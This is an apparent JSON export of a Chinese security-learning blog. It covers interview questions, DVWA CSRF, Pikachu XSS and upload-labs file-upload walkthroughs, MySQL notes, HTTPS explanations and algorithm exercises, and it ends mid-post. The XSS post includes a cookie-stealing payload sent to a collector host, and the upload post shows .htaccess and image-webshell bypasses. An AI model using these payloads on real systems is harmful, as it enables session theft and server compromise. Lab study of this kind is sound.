[{"title":"快手--安全工程师","date":"2020-05-06T16:00:00.000Z","path":"快手面试-安全工程师/","text":"一面攻击手法xss攻击sqlmap的用法，简单用法csrf的防御方法sql注入的防御方法 网络浏览器输入地址，具体的请求TCP的四次挥手 数据库写一个sql语句 编程分布式爬虫两道编程题(因为第一个没做出来，所以又出了一道)Python的内存管理 操作系统Linux查找nignx的PID","tags":[]},{"title":"字节跳动--安全工程师","date":"2020-05-05T16:00:00.000Z","path":"字节跳动-安全工程师/","text":"一面攻击手法反射型的xss攻击怎么实现的，基于get请求的xss的防御方法xss攻击绕过，如果是替换一次的怎么做 网络FTP是基于UDP还是TCP，为什么TCP和UDP的区别FTP的两种模式TCP的重传机制 编程语言Python协程和线程的区别线程的上下文都有什么东西协程为什么比线程快socket通信的流程，listen和accept的区别，listen和accept的返回值实现一个爬虫框架 写代码手写一个排序","tags":[]},{"title":"csrf攻击思路","date":"2020-04-23T16:00:00.000Z","path":"csrf攻击实验/","text":"绕过Referer来自于DVWA中的csrf中级难度，通过源码可以看出只是检查了referer 123if( isset( $_GET[ 'Change' ] ) ) &#123; // Checks to see where the request came from if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false ) &#123; 所以我们只需要在其他的主机上写一个类似1.192.168.1.33.html的文件，192.169.1.33是运行DVWA的主机host，在里面构造一个请求 1&lt;img src=\"http://192.168.1.33:8001/vulnerabilities/csrf/?password_new=qqq&amp;password_conf=qqq&amp;Change=Change#\"&gt; 被攻击者点击该请求后，就会触发更改密码的请求。","tags":[{"name":"csrf","slug":"csrf","permalink":"https://makerdd.github.io/tags/csrf/"}]},{"title":"MySQL连接总结","date":"2020-04-12T16:00:00.000Z","path":"MySQL连接总结/","text":"环境ubuntu-18.10-desktopmysql-server version:5.7.29 登录设置创建的root用户的登录方式默认是auth_socket，是不需要输入密码的，首先在mysql库user表中更改连接方式， 1UPDATE user SET plugin='mysql_native_password' where user='root'; 连接方式更改为传统的帐号密码方式。 密码修改1SET password for root=PASSWORD(\"your password\") 远程连接MySQL默认是监听127.0.0.1的3306端口，需要改为0.0.0.0。在 1&#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf 文件中，把bind-address改为0.0.0.0。","tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://makerdd.github.io/tags/MySQL/"}]},{"title":"关于MySQL隐式转换","date":"2020-04-05T16:00:00.000Z","path":"关于MySQL隐式转换/","text":"问题发现之前在学习sql注入时，有时感觉不应该得到的值却也得到了，没想明白是为什么，比如说： 1select * from users where id=1' 这样的sql语句是照样可以把id=1的一行取到的，后来查了相关资料，了解到这是MySQL的隐式转换。 大体内容这个链接给出了隐式转换中的一些规则，不过关于字符串的更加详细的规则，官方并没有给出，指出了这样一句话， In all other cases, the arguments are compared as floating-point (real) numbers. For example, a comparison of string and numeric operands takes places as a comparison of floating-point numbers.大致意思是：在所有其他情况下，将参数作为浮点数（实数）进行比较。 例如，将字符串和数字操作数进行比较，将其作为浮点数的比较。 然后给了几个例子，我们可以从例子中总结一些规律。 12345678mysql&gt; SELECT 1 &gt; '6x'; -&gt; 0mysql&gt; SELECT 7 &gt; '6x'; -&gt; 1mysql&gt; SELECT 0 &gt; 'x6'; -&gt; 0mysql&gt; SELECT 0 = 'x6'; -&gt; 1 上面可以总结一下，字符串转换为数字时，从左边开始处理，遇到非数字字符，就停止了，如果第一个字符就是非数字字符，则为0，所以最开始那条sql语句也可以解释通了，相当与id=1。但是如果是这种的sql语句： 1SELECT 1=(\"1\"); 就可以返回1，貌似MySQL对对称的括号，引号也会进行处理，这个的话，还是需要再研究一下。 总结隐式转换还会发生在很多场景，比如操作符之类的，目前还没有太多sql经验，无法总结，总之这个坑挺大的，给sql注入也带来了很多可能，后面会再总结一些相关知识的。 参考链接Mysql 数据类型隐式转换规则MySQL隐式转化整理","tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://makerdd.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"Pikachu靶场XSS思路","date":"2020-04-04T16:00:00.000Z","path":"Pikachu靶场XSS思路/","text":"反射型xss(get)这个在前端对输入的字符串的长度做了限制，前端的限制都是唬人的，改掉就可以了，然后输入测试字符串 1'\"&lt;&gt;?&amp; 在源码里定位一下，然后观察到url， 12&lt;p class='notice'&gt;who is '\"&lt;&gt;&amp;?,i don't care!&lt;/p&gt;http://127.0.0.1:8000/vul/xss/xss_reflected_get.php?message=%27%22%3C%3E%26%3F&amp;submit=submit 通过抓包可以知道并没有与后台发生交互，说明是反射型；通过url可以看出是get型。构造payload， 1&lt;script&gt;alert(1)&lt;/script&gt; 我们就可以把构造的url发给别人，达到xss攻击的效果。 反射型xss(post)这个题目按照网上的做法我没有成功，因为浏览器会在单引号前加上转义字符，造成js脚本无法执行。 1&lt;script&gt;alert(\\'1\\')&lt;script&gt; 比如我想弹一个字符’1’，但浏览器会在前后加上转义符，造成脚本并没有执行，最终的解决方案是使用&lt;svg&gt;标签，后面会细说。首先这是一道post请求的xss攻击，get请求我们可以把攻击脚本嵌入到url里，达到攻击效果，post请求url里并没有payload，如何才能达到攻击效果。我们可以自己搭建一个可以post请求的页面，作者已经给我们写好了这个页面，注意修改请求的ip地址。 12345678&lt;form method=\"post\" action=\"http://192.168.1.4/pikachu/vul/xss/xsspost/xss_reflected_post.php\"&gt; &lt;input id=\"xssr_in\" type=\"text\" name=\"message\" value= \"&lt;script&gt;document.location = 'http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=' + document.cookie; &lt;/script&gt;\" /&gt; &lt;input id=\"postsubmit\" type=\"submit\" name=\"submit\" value=\"submit\" /&gt;&lt;/form&gt; 首先这个post页面中有一个表单，值是下面这一串 123 &quot;&lt;script&gt; document.location &#x3D; &#39;http:&#x2F;&#x2F;192.168.1.15&#x2F;pkxss&#x2F;xcookie&#x2F;cookie.php?cookie&#x3D;&#39; + document.cookie;&lt;&#x2F;script&gt;&quot; 发送给下面这个链接 1http:&#x2F;&#x2F;192.168.1.4&#x2F;pikachu&#x2F;vul&#x2F;xss&#x2F;xsspost&#x2F;xss_reflected_post.php 也就是有xss漏洞的那个页面，当浏览器发生跳转后，从(post.html到xss_reflected_post.php)，会执行script标签里的脚本，这个脚本是请求 1http:&#x2F;&#x2F;192.168.1.15&#x2F;pkxss&#x2F;xcookie&#x2F;cookie.php 上面这个页面，带有参数，参数是从带有xss漏洞的页面上取到的cookie，后台收集cookie的页面会继续重定向到首页，像是什么也没有发生一样。思路大致就是这样，不过我在post页面上稍做了修改。 12345678&lt;form method=\"post\" action=\"http://192.168.1.4/pikachu/vul/xss/xsspost/xss_reflected_post.php\"&gt; &lt;input id=\"xssr_in\" type=\"text\" name=\"message\" value= \"&lt;svg&gt;&lt;script&gt;document.location = &amp;#38;#39;http://192.168.1.33/pkxss/xcookie/cookie.php?cookie=&amp;#38;#39; + document.cookie; &lt;/script&gt;\" /&gt; &lt;input id=\"postsubmit\" type=\"submit\" name=\"submit\" value=\"submit\" /&gt;&lt;/form&gt; 首先在&lt;script&gt;标签前加了一个&lt;svg&gt;标签，参考此链接，然后利用&amp;#38;是&amp;的实体转义，因为我们的请求经历了两次解析，所以第一次请求&amp;#38;变成了&amp;，第二次请求把&amp;#39;变成了&#39;，这样就可以成功执行js脚本了。浏览器解析这方面还是很有必要下功夫研究的。 存储型xss存储型xss顾名思义就是会储存到数据库中，造成持续的伤害，先输入一段测试字符串 1'\"&lt;&gt;?&amp;666666 可以检测是否对这些特殊字符进行处理，666666用来定位字段，提交后，查看评论的位置。 1&lt;p class='con'&gt;'\"&lt;&gt;?&amp;666666&lt;/p&gt;&lt;a href='xss_stored.php?id=61'&gt;删除&lt;/a&gt; 然后就可以构造payload了， 12&lt;/p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt; 上面两个均可，每次打开这个页面都会执行脚本，存储型xss原理即是如此。 DOM型xss我们先随便输入字符串，查看一下这个submit要搞什么鬼，然后会出现一个带链接的what do you see?，点击这个字符会跳转到某个链接，查看一下输入字符后发生了什么。 123456789&lt;script&gt;function domxss()&#123; var str = document.getElementById(\"text\").value; document.getElementById(\"dom\").innerHTML = \"&lt;a href='\"+str+\"'&gt;what do you see?&lt;/a&gt;\";&#125;&lt;/script&gt;&lt;input id=\"text\" name=\"text\" type=\"text\" value=\"\" /&gt;&lt;input id=\"button\" type=\"button\" value=\"click me!\" onclick=\"domxss()\" /&gt;&lt;div id=\"dom\"&gt;&lt;/div&gt; 这一段就是前端对我们的输入的操作，点击提交后，会调用domxss函数。然后该函数取出我们输入的字符串，插入到div中间，然后点一下会跳转到相应的链接。既然使用到了点击的动作，那我们就构造一个点击时的xss攻击，删掉双引号和加号后，str就是我们输入的内容，构造如下 12345678待构造payload&lt;a href='str'&gt;what do you see?&lt;/a&gt;构造payload&lt;a href='1' onclick=alert(1)&gt;'&gt;what do you see?&lt;/a&gt;取出payload1' onclick=alert(1)&gt; 这样当点击时，就会弹窗，这个利用起来貌似有点困难，只牵涉到前端的变化，而且发送不到别人那里。 DOM型xss-x作者也介绍了前端的写法千奇百怪，我们先理清一下这个是要做什么，看一下源码， 12345678910111213&lt;script&gt; function domxss()&#123; var str = window.location.search; var txss = decodeURIComponent(str.split(\"text=\")[1]); var xss = txss.replace(/\\+/g,' '); document.getElementById(\"dom\").innerHTML = \"&lt;a href='\"+xss+\"'&gt;就让往事都随风,都随风吧&lt;/a&gt;\"; &#125;&lt;/script&gt;&lt;form method=\"get\"&gt;&lt;input id=\"text\" name=\"text\" type=\"text\" value=\"\" /&gt;&lt;input id=\"submit\" type=\"submit\" value=\"请说出你的伤心往事\"/&gt;&lt;/form&gt;&lt;div id=\"dom\"&gt;&lt;/div&gt; 输入字符串后点提交，表单是以get方式提交的，url会发生改变，后端会进行一个这样的处理 1$html.= \"&lt;a href='#' onclick='domxss()'&gt;有些费尽心机想要忘记的事情,后来真的就忘掉了&lt;/a&gt;\"; 点击这句话，触发domxss函数，会查找search的内容，把参数取出来，放到id为dom的标签里，这点和上面一题的类似，我们可以构造payload了，其实和上面一题可以完全相同。 11' onclick=alert(1)&gt; 这种牵涉到url的DOM型就可以产生攻击行为了，将我们构造好的url发给别人，产生攻击。 参考链接：xss编码绕过原理以及从中学习到的几个例子深入理解浏览器解析机制和XSS向量编码SVG XSS的一个黑魔法XSSer 升级之路XSS常见Paylaod分析-1XSS 绕过常用语句HTML 字符实体HTML ISO-8859-1 参考手册PHP URL 重定向 的三种方法（转) headerHTML &lt;form&gt; 标签的 action 属性","tags":[{"name":"XSS漏洞","slug":"XSS漏洞","permalink":"https://makerdd.github.io/tags/XSS%E6%BC%8F%E6%B4%9E/"}]},{"title":"wireshark分析https","date":"2020-04-01T16:00:00.000Z","path":"wireshark分析https/","text":"概述https是加密过的应用层协议，如果直接使用wireshark抓包，抓到的信息解析不出来，我们也看不懂，密钥信息浏览器都知道的，以Linux下的谷歌浏览器为例，如何让wireshark可以解析出https。 具体做法首先设置一个环境变量，然后新建此文件，注意该文件的权限问题。 1SSLKEYLOGFILE&#x3D;&quot;&#x2F;tmp&#x2F;sslkeylog.txt&quot; 环境变量可以设置在/etc/profile或者用户下的配置文件中，如果是写在了用户目录下，需要命令行中启动浏览器，应该是因为安装浏览器是全局安装的，所以不会检查用户的环境变量。SSLKEYLOGFILE是浏览器提供的一个功能，可以把通信中的SSL信息写入到此文件中。接着设置wireshark，在编辑–首选项–协议里找到SSL或者TLS协议，有个(Pre)-Master-Secret log filename选项，浏览到刚刚新建的文件夹下，如果需要的话，可以再设置一下debug file，查看解密情况。此时，再用wireshark抓包，就可以看到https的通信了。 参考链接如何用 wireshark 抓包 TLS 封包SSL/TLS协议详解","tags":[{"name":"wirkshark","slug":"wirkshark","permalink":"https://makerdd.github.io/tags/wirkshark/"},{"name":"https","slug":"https","permalink":"https://makerdd.github.io/tags/https/"}]},{"title":"关于HTTPS","date":"2020-03-31T16:00:00.000Z","path":"关于HTTPS/","text":"概述从http迈向https，安全因素是首要因素，大致讲述一下https的流程，表达有误的地方多多包涵。 摘要算法摘要算法是将任意长度的文本，通过一个算法，得到一个固定长度的文本。常见的有MD5消息摘要算法及SHA家族安全散列算法。 加密算法有对称加密和非对称加密。对称加密是在加密和解密时使用相同的密钥，常见的对称加密算法有AES、ChaCha20、3DES、Salsa20、DES、Blowfish、IDEA、RC5、RC6；对称加密的速度比公钥加密快很多。非对称加密，它需要两个密钥，一个是公开密钥，另一个是私有密钥；使用公钥加密后所得的密文，只能用相对应的私钥才能解密并得到原本的明文；反之，使用私钥加密所得的密文，只能通过对应的公钥才能解密并得到原本的密文。公钥可以公开，可任意向外发布；私钥不可以公开，必须由用户自行严格秘密保管，绝不透过任何途径向任何人提供。 数字签名我们可以直接对消息进行签名，验证者用公钥正确解密消息，如果和原消息一致，则验证签名成功。但通常我们会对消息的散列值签名，因为通常散列值的长度远小于消息原文，使得效率大大提高。签名可以保证消息的完整性， 确认消息的发送者身份，同时发送者对发送过此消息的事实具有不可否认性。 CA证书加入我要申请一个证书，我先在自己搞出来一对公钥和私钥，然后我把公钥和我想生成的证书的一些信息发给证书机构，证书机构人员会审核我的请求，如果认为我是可信的，证书机构会把我的公钥和相关信息组成证书的基本数据，且证书机构用自己的私钥对我的公钥加上数字签名，最后生成证书。证书一般会包括以下几部分：版本，序号，主体，发行者，有效期开始时间，有效期结束时间，公开密钥用途，公开密钥，公开密钥指纹，数字签名，主体别名。想要访问我的网站的人可以使用证书机构的公钥验证数字签名，如果验证成功，则可以证明公钥确实是我的，访问网站的人就可以使用证书上的我的公钥来加密明文，把密文发送网站，而我可以使用自己的私钥把密文解密，得到明文。在本机里，会预置一些CA机构的根证书及其他证书，可以用这些证书去验证其他下一级证书。 HTTPS流程以访问https://httpbin.org/robots.txt为例，浏览器得到的结果会是 12User-agent: *Disallow: &#x2F;deny 通过抓包可以分析一下大致过程，关于wireshark如何解析https请看这篇文章。首先tcp三次握手，然后客户端发出server hello，此时会发出客户端支持的加密方式和一个随机数；服务端收到请求后，也会发送一个随机数；然后还会发送该网站的证书，会传输多个证书，这些证书是嵌套关系的，最小层面的就是该网站的证书。根证书会验证它下一级证书，然后直到该网站的证书，由它的上一级的公钥去验证数字签名，验证通过的话，则证明该证书就是CA机构给该网站颁发的，而且是完整的；证书上含有公钥信息，客户端拿到公钥后，会再生成一个随机数，然后使用公钥对该随机数进行加密，到了服务端，服务端只能用私钥进行解密，此时共产生了三个随机数，前两个随机数是明文的，最后一个随机数是加密的，而且客户端和服务端都知道这三个随机数，然后使用约定的加密算法，会得到一个用于对称加密通信的密钥，为什么又回到对称加密，因为非对称加密的资源消耗太大。这是通信的总过程，中间还有很多复杂的算法，可以抓包分析一下。 总结HTTPS的安全是有信的过的机构做支撑，并不是因为有绝对安全的算法，如果中间任意一环机构出问题，那通信也不再安全。 参考链接维基百科让面试官膜拜你的HTTPS运行流程（超详细）如何用 wireshark 抓包 TLS 封包数字签名是什么？","tags":[{"name":"https","slug":"https","permalink":"https://makerdd.github.io/tags/https/"}]},{"title":"upload-labs 思路","date":"2020-03-29T16:00:00.000Z","path":"upload-labs思路/","text":"靶场介绍upload-labs是一个关于文件上传漏洞的靶场，作者是c0ny1，链接，简体中文，界面也很漂亮，而且有提示。我是通过docker搭建的环境，然后上传文件时，提示上传失败，因为没有创建upload文件夹，然后需要创建该文件夹并给文件夹赋予一定的权限。 第1关这关只是在前端进行了后缀名的检查，前端的检查都基本没用，可以轻而易举的绕过。可以有两种方式：1.使用插件JavaScript Toggle On and Off(火狐)，可以使脚本失效；2.在burpsuite中开启截断，先上传符合要求的文件，然后在bp中进行修改。 第2关首先有个MIME的概念，中文意思是媒体类型，标识http传输的是哪种媒体，常见的有音频，视频，图片，文本。其位于Content-Type字段里，这关就是通过对MIME进行检查，防止上传不合规的文件类型，查看一下作者给的帮助源码： 123if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) 可以看出文件类型必须符合这三种，服务端才接收，那只需要在bp中拦截，修改Content-Type的值即可。MIME是由专门的组织规定的，这样我们也大概可以猜出来怎么修改，常见MIME类型。 第3关看网上写的可以上传php3，php4，php5及phtml，但是我的靶机(docker搭建)都不能对这些文件进行解析，于是这些都失败了；然后还有一种就是上传.htacess文件，这个文件是可以对该目录进行一些配置，这些配置会覆盖主配置，但上传后，服务器端对此重新命了名，.htacess前面加了一串时间和随机数，这个也不是配置文件了，自然apache不会对此进行解析。暂时没有找到这关的解决方案。查看函数deldot的代码，会把删除后面的所有的’.’: 1234567891011function deldot($s)&#123; for($i = strlen($s)-1;$i&gt;0;$i--)&#123; $c = substr($s,$i,1); if($i == strlen($s)-1 and $c != '.')&#123; return $s; &#125; if($c != '.')&#123; return substr($s,0,$i+1); &#125; &#125;&#125; 以后再补 第4关第4关和第3关的区别就是上传.htaccess文件，第4关不会重命名，第3关会重命名，那第4关就可以先上传一个.htaccess文件，文件内容： 1AddType application/x-httpd-php .ppp 意为ppp后缀名的文件使用php解析，然后再上传一个带有webshell的ppp文件即可。 第5关分析源码里是没有对大小写进行转换的，所以可以php大小写组合来上传，Windows对大小写不敏感，可以解析；Linux对大小写敏感，故这个方法实现不了。 第6关这个是没有对空格进行处理，在php后缀名加上空格，便不会被筛选掉，还能解析，同样Windows可以，Linux不可以。 第7关这个是没有对”.”进行处理，在php后缀加上”.”，依然Windows可以，Linux不可以，足可见Windows上跑服务，要操心的事情更多。 第8关::$DATA暂时不是很懂，以后再更 第9关这个是对上传的文件并没有进行重命名，只对原文件的名称进行了去除后面”.”的处理，那把文件名为”1.php. .”，注意倒数第二位是空格，依然只能在Windows上成功。 第10关这一关的要求也是比较松的，只是进行了文本替换，利用文本替换的漏洞尝试一下，文本替换函数str_ireplace，只会遍历一次，所以后缀名为demo.pphphp这样，遍历一次，除去嵌套的php，正好只剩下外面的php。 第11关这关的获取后缀的写法与之前的有所不同，学习一下php字符串的函数， 1$file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); strrpos是获取某一字符串在另一字符串最后的位置，这里找的是最后一个点，没有则返回false，substr是截取字符串，这里就是获取后缀。这一关是白名单限制，而且会在源码里发现是get请求，从url中也可以看出来有一个save_path的变量，如果php版本&lt;5.3.4，而且magic_quotes_gpc为OFF状态，那就可以去做00截断，%00是ASCII里的null，出现在url里，会在此截断，所以在bp里构造出这样的url： 1localhost:&#x2F;&#x2F;Pass-11&#x2F;index.php?save_path&#x3D;..&#x2F;upload&#x2F;demo.php%00 这样上传的文件名就变成demo.php了。 第12关与第11关类系，之不过请求方式变成了post，要注意的是post不会自动转码，需要hex中增加00。 第13关这一关是上传一个图片马，根据源码可以看出是对文件的幻数进行检查，维基解释文件幻数：在特定文件格式中加入固定数值和固定字符串，然后便可以通过检查文件是否包含这些数据来快速地识别文件格式。比如： 123.jpg FF D8 FF E0 00 10 4A 46 49 46.gif 47 49 46 38 39 61.png 89 50 4E 47 本关是直接取的前两个字节，然后拼成数字进行比较的，比如jpg格式的，FF是255，D8是216，那拼接出来的数字就是255216。可以通过在图片后面附加php的代码来制作图片马，由于本关的限制比较少，我直接用bp截断后，然后在文件头加上了jpg的文件幻数。之后要利用文件包含漏洞来执行php代码，作者提示使用文件包含漏洞， 123456789101112 &lt;?php/*本页面存在文件包含漏洞，用于测试图片马是否能正常运行！*/header(\"Content-Type:text/html;charset=utf-8\");$file = $_GET['file'];if(isset($file))&#123; include $file;&#125;else&#123; show_source(__file__);&#125;?&gt; 提供的参数是file，include.php脚本在根目录的下一层，构造链接 1http:&#x2F;&#x2F;127.0.0.1:8081&#x2F;include.php?file&#x3D;upload&#x2F;3620200402121417.jpg 即可执行所包含的php脚本。作者要求要jpg，png，gif三种格式均上传成功，不知道里面是否有什么玄机，后面两种之后在测试。 第14关这关的源码里有几个新的函数，我截取下来学习一下 1234567891011121314151617181920212223function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext))&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;//getimagesize返回的结果是(width, height, type, attr)，//type是文件类型，结果是int型，attr指的是width, height的文本//image_type_to_extension是通过返回的int型，寻找对应的字符串，//比如：1 = GIF，2 = JPEG，3 = PNG，4 = SWF，5 = PSD//stripos是寻找字符串2在字符串1中第一次出现的位置，不区分大小写，//如果没有出现，返回FALSE 上传png格式的图片，在png图片的末尾加上php代码即可。 第15关这一关貌似没有增加其他难度，只是换了查看图片格式的函数，应该是我才学疏浅，没有看出变化，exif_imagetype函数比getimagesize函数的速度更快，但也是检查头部的几个字节，所以上面的方法依然可以用。 第16关先了解一下这三个曝光率很高的变量 123456789101112$filename = $_FILES['upload_file']['name'];$filetype = $_FILES['upload_file']['type'];$tmpname = $_FILES['upload_file']['tmp_name'];//upload_file是定义在这部分&lt;input class=\"input_file\" type=\"file\" name=\"upload_file\"/&gt;//type是从请求头里content-type里取到的//tmp_name是生成的一个临时文件，存放位置由配置决定，命名有随机性//basename可以取到路径里的文件的名称$target_path=UPLOAD_PATH.basename($filename); 下面是一段执行逻辑 123456789101112131415161718192021222324252627282930313233 if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\"))&#123; if(move_uploaded_file($tmpname,$target_path)) &#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = \"该文件不是jpg格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; $newimagepath = UPLOAD_PATH.$newfilename; imagejpeg($im,$newimagepath); //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.$newfilename; @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125;//imagecreatefromjpeg是根据文件信息，重新组合图片，重组的原理还未搞清//unlink是删除函数，@运算符的作用://当将其放置在一个 PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。//也就是说重组之后，文件出问题，就会删掉那个文件//imagejpeg函数会重新生成一个图片，但好像作者没有写再次上传的函数，我用的是Docker版的，貌似小bug多一些。//绕过渲染的方法，究竟如何绕过还是要看一下imagecreatefromjpeg的实现源码，//网上的方法是，通过对比原文件和渲染后的文件的不变之处，把代码插进去，这样总有一些不当之处，等研究了php源码之后，//再来补充这一部分知识。 第17关第18关第19关第20关","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"https://makerdd.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"动态规划刷题","date":"2020-03-24T16:00:00.000Z","path":"动态规划刷题/","text":"分金子（360公司2017春招真题）题目链接https://exercise.acmcoder.com/online/online_judge_ques?ques_id=3863&amp;konwledgeId=42可以去链接里看一看，不再赘述题目了。 解题思路假设几个变量，f(i,j)是从[i，j]中可以拿到的最大价值，因为只可以从两端拿，假如先手是从最左端拿的，那剩下的最大价值就是f(i+1,j)，也就是后手能拿到的最大价值；那先手能拿到的最大价值可以用sum(i,j)-f(i+1,j)来表示。假如先手是从最右端拿的，剩下最大价值就是f(i,j-1)，也就是后手能拿到的最大价值；那先手能拿到的最大价值可以用sum(i,j)-f(i,j-1)来表示。那究竟应该从哪边拿，当然是看f(i+1,j)和f(i,j-1)的大小，最后可以提炼出 1f(i,j) &#x3D; max&#123;(sum(i,j)-f(i+1,j)),sum(i,j)-f(i,j-1)&#125; &#x3D; sum(i,j)-min&#123;f(i+1,j),f(i,j-1)&#125; 代码实现递归版从上式可以看出，递归是一种解决方案，为了避免重复计算，使用一个变量来记录算出来的f(n,m)的值。 123456789101112131415161718def digui(lst,i,j): if(i==j): return lst[i] elif(res[i][j]!=0): return res[i][j] else: res[i][j]=sum(lst[i:j+1])-min(digui(lst,i+1,j),digui(lst,i,j-1)) return res[i][j]n=int(input())for q in range(n): num=int(input()) res = [[0]*(num+1) for i in range(num+1)] lst=list(map(int,input().split())) lst=[0]+lst a=digui(lst,1,num) b=sum(lst)-digui(lst,1,num) print(\"Case #%s: %s %s\"%(q+1,a,b)) 动态规划版我也说不上来什么叫做动态规划，总之大家都是这样叫的，当初看别人代码时，也是一脸懵比，然后自己整个手推了一遍，豁然开朗。我们使用给的案例 14 7 2 9 5 2 上面是一列金子，先画一张表，为了方便表示，我们从1开始，0列0行都当作是空白‘’|0|1|2|3|4|5|6–|–|–|–|–|–|–|–0|‘’|‘’|‘’|‘’|‘’|‘’|‘’1|‘’|‘’|‘’|‘’|‘’|‘’|‘’2|‘’|‘’|‘’|‘’|‘’|‘’|‘’3|‘’|‘’|‘’|‘’|‘’|‘’|‘’4|‘’|‘’|‘’|‘’|‘’|‘’|‘’5|‘’|‘’|‘’|‘’|‘’|‘’|‘’6|‘’|‘’|‘’|‘’|‘’|‘’|‘’接下来可以填表了，假如是从[1,1]取，那就一种取法，就是该位置上的数量，其他只有一个金子的情形也是这样，填表。‘’|0|1|2|3|4|5|6–|–|–|–|–|–|–|–0|‘’|‘’|‘’|‘’|‘’|‘’|‘’1|‘’|4|‘’|‘’|‘’|‘’|‘’2|‘’|‘’|7|‘’|‘’|‘’|‘’3|‘’|‘’|‘’|2|‘’|‘’|‘’4|‘’|‘’|‘’|‘’|9|‘’|‘’5|‘’|‘’|‘’|‘’|‘’|5|‘’6|‘’|‘’|‘’|‘’|‘’|‘’|2那如果是[1,2]该怎么取呢，公式交给我们，应该是先得到[1,2]的和，然后减去较小的那个，那[2,3],[3,4]也是类似。‘’|0|1|2|3|4|5|6–|–|–|–|–|–|–|–0|‘’|‘’|‘’|‘’|‘’|‘’|‘’1|‘’|4|7|‘’|‘’|‘’|‘’2|‘’|‘’|7|7|‘’|‘’|‘’3|‘’|‘’|‘’|2|9|‘’|‘’4|‘’|‘’|‘’|‘’|9|9|‘’5|‘’|‘’|‘’|‘’|‘’|5|56|‘’|‘’|‘’|‘’|‘’|‘’|2规律很明显了，接着填表即可，最后表的状态如下。‘’|0|1|2|3|4|5|6–|–|–|–|–|–|–|–0|‘’|‘’|‘’|‘’|‘’|‘’|‘’1|‘’|4|7|6|16|11|182|‘’|‘’|7|7|11|16|243|‘’|‘’|‘’|2|9|7|114|‘’|‘’|‘’|‘’|9|9|115|‘’|‘’|‘’|‘’|‘’|5|56|‘’|‘’|‘’|‘’|‘’|‘’|2那[1,6]最大的收益就是1行6列的18了，后面只需要交给计算机来帮我们填表即可。 12345678910111213141516171819n=int(input())for q in range(n): num=int(input()) lst = list(map(int,input().split())) res = [[0]*(num+1) for i in range(num+1)] for i in range(1,num+1): res[i][i] = lst[i-1] cnt=1 while cnt&lt;=num: i=1 j=i+cnt while j&lt;=num: res[i][j] = sum(lst[i-1:j]) - min(res[i][j-1],res[i+1][j]) i+=1 j+=1 cnt+=1 a = res[1][num] b = sum(lst) - a print(\"Case #%s: %s %s\"%(q+1,a,b))","tags":[{"name":"动态规划","slug":"动态规划","permalink":"https://makerdd.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]},{"title":"贪心算法刷题","date":"2020-03-17T16:00:00.000Z","path":"贪心算法刷题/","text":"1.递增数组题目链接：递增数组题目介绍： 牛牛有一个数组array，牛牛可以每次选择一个连续的区间，让区间的数都加1，他想知道把这个数组变为严格单调递增，最少需要操作多少次？ 思路：严格递增，我们应该让某个数字后面的一个比他小的连续区间都进行加1操作，然后遍历整个数组(除最后一个数字)。其实我们不需要真正的对数组进行加1操作，只需要求出ai与ai+1的差，再加上1,就是需要加1的次数，不需要真正进行加1,因为如果ai+n比a[i]大，那这个加1操作与a[i+n]无关，如果比a[i]小，则也会相应加1,与a[i+1]的差并不会改变，当a[i+1]被当作前面的数时，求的依然是两者的差值，故不进行加1操作也不会影响最后的次数。 代码123456class Solution: def IncreasingArray(self , array): cnt=0 for i in range(len(array)-1): cnt+=max(0,array[i]-array[i+1]+1) return cnt 2.牛牛的AC题目链接：牛牛的AC题目介绍 一年一度的春招就要到来了，牛牛为了备战春招，在家刷了很多道题，所以牛牛非常喜欢AC这两个字母。他现在有一个只包含A和C的字符串，你可以任意修改最多k个字符，让A变成C，或者C变成A。请问修改完之后，最长连续相同字符的长度是多少。 思路跟上面的那道题类似，也是对列表进行操作，但实际上又不用真正的去操作。依然使用贪心的”想当然”策略。想要最长连续相同字符串，又最多改变k个字符，那我们就在字串里找，这个字串中有k个字符与剩下的字符不同，这都是我们可以容忍的，记录下在能容忍的情况下，字串的最长大小就是最后的结果。主要是用什么方法来记录一个字串，我尝试的是two points的方法，设置左右两个游标来限定为一个字符串。该问题还有一个点就是怎么计算是否超过限定的k，我刚开始使用.count()的方法，超时了。后面参考别人的代码，应该使用变量来记录下这个子串中的某个字符的数量，这样就没有必要每次去再遍历子串了。那我们需要A2C，C2A进行两次，然后求最大值嘛？这个是不需要的，题目中只要求返回长度，那我们在记录数量时，A和C的数量都记录下来，然后当两个都不能容忍k时，再让左端游标移动，这个有点与非的意思。 代码12345678910111213141516class Solution: def Solve(self , k , s ): right,left=0,0 max_len=0 s_length=len(s) A_cnt,C_cnt=0,0 while right&lt;s_length: if(s[right]=='A'):A_cnt+=1 if(s[right]=='C'):C_cnt+=1 right+=1 while (A_cnt&gt;k and C_cnt&gt;k): if(s[left]=='A'):A_cnt-=1 if(s[left]=='C'):C_cnt-=1 left+=1 max_len=max(right-left,max_len) return max_len 3.扔骰子题目链接：扔骰子题目介绍 